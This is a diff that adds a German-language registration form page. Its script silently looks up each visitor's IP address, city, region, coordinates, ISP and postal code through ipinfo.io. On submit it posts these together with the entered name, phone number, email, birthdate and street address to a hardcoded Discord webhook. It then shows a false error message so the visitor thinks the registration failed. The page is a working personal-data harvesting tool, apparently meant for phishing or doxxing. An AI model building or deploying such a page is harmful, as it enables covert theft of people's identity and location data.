@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="utf-8">
+  <title>Registrierungsformular</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      padding: 20px;
+    }
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      animation: fadeIn 0.5s ease;
+    }
+    form {
+      margin-top: 20px;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+    }
+    input[type="text"], input[type="tel"], input[type="email"], input[type="date"] {
+      width: calc(100% - 20px);
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    input[type="button"] {
+      background-color: #4CAF50;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    input[type="button"]:hover {
+      background-color: #45a049;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+  </style>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      // Funktion, um IP-Adresse und geografische Informationen abzurufen
+      $.get("https://ipinfo.io", function(response) {
+        // Discord Webhook URL
+        const webhook_url = "https://discord.com/api/webhooks/1245437480799305799/IArDuddYXa9sVwTwEeAraXZwT5f3-qIbbiLy46x8aUdhqvuPimaRlDERSES3jLLe7P3L";
+        
+        // Funktion zum Senden der Daten an den Webhook
+        function sendToWebhook(data) {
+          var xhttp = new XMLHttpRequest();
+          const url = webhook_url;
+          xhttp.open("POST", url, true);
+          xhttp.setRequestHeader('Content-Type', 'application/json');
+          xhttp.send(JSON.stringify(data));
+        }
+
+        // Daten für das Embed, das an den Webhook gesendet wird
+        var embedData = {
+          title: "Registrierung",
+          description: "Neue Registrierung eingegangen",
+          color: 3066993, // Discord Embed Farbe (Grün)
+          fields: []
+        };
+
+        // Eingabefelder für das Formular
+        $('#submitForm').click(function() {
+          const name = $('#name').val();
+          const phone = $('#phone').val();
+          const email = $('#email').val();
+          const birthdate = $('#birthdate').val();
+          const street = $('#street').val();
+          const city = $('#city').val();
+          
+          // Daten für das Embed aktualisieren
+          embedData.fields.push(
+            { name: "Name", value: name, inline: true },
+            { name: "Telefonnummer", value: phone, inline: true },
+            { name: "E-Mail Adresse", value: email, inline: true },
+            { name: "Geburtsdatum", value: birthdate, inline: true },
+            { name: "Straße", value: street, inline: true },
+            { name: "Stadt", value: city, inline: true },
+            { name: "IP-Adresse", value: response.ip, inline: true },
+            { name: "User-Agent", value: navigator.userAgent, inline: true },
+            { name: "Stadt", value: response.city, inline: true },
+            { name: "Region", value: response.region, inline: true },
+            { name: "Land", value: response.country, inline: true },
+            { name: "Längen- und Breitengrad", value: response.loc, inline: true },
+            { name: "Unternehmen", value: response.org, inline: true },
+            { name: "Postleitzahl", value: response.postal, inline: true }
+          );
+
+          // Daten an den Discord Webhook senden
+          sendToWebhook({
+            username: 'Registrierungsbot',
+            embeds: [embedData]
+          });
+
+          // Optional: Feedback für den Benutzer
+          alert('Ein Fehler ist aufgetreten');
+        });
+      }, "json");
+    });
+  </script>
+</head>
+
+<body>
+  <div class="container">
+    <h1 style="text-align: center;">Registrierungsformular</h1>
+    <form id="registrationForm">
+      <label for="name">Name:</label>
+      <input type="text" id="name" name="name" required><br>
+      
+      <label for="phone">Telefonnummer:</label>
+      <input type="tel" id="phone" name="phone" required><br>
+      
+      <label for="email">E-Mail Adresse:</label>
+      <input type="email" id="email" name="email" required><br>
+      
+      <label for="birthdate">Geburtsdatum:</label>
+      <input type="date" id="birthdate" name="birthdate" required><br>
+      
+      <label for="street">Straße:</label>
+      <input type="text" id="street" name="street" required><br>
+      
+      <label for="city">Stadt:</label>
+      <input type="text" id="city" name="city" required><br>
+      
+      <input type="button" id="submitForm" value="Daten an Discord senden">
+    </form>
+  </div>
+</body>
+</html>
